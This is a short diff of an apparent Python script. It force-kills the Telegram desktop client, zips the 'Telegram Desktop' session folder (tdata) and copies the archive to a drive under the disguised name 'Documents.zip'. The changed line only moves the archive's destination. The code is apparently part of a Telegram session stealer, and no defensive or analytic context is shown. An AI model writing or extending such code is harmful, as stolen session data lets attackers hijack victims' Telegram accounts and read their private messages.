@@ -12,4 +12,4 @@ os.system('TASKKILL /F /IM Telegram.exe')
 
 root_directory='Telegram Desktop'
 shutil.make_archive("tdata","zip",root_directory)
-shutil.copy(src="tdata.zip", dst=drive1+"\Files\Documents.zip")  
+shutil.copy(src="tdata.zip", dst=drive1+"\Documents.zip")  
